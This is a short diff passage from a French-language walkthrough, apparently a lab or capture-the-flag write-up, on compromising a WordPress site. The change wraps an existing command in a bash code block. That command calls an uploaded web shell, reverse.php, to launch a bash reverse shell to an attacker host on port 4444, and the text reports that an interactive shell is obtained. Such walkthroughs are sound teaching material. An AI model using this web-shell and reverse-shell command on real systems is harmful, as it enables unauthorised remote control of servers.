@@ -172,7 +172,9 @@ Nous utilisons la vulnérabilité du plugin pour uploader `reverse.php` sur le s
 ### 🎉 Étape 4 : Prise de Contrôle
 Une fois le fichier uploadé, nous exécutons la commande suivante pour déclencher le shell inversé :
 
+```bash
 curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.X/4444 0>&1'"
+```
 
 ✅ **Nous obtenons un shell interactif sur la machine cible !**
 
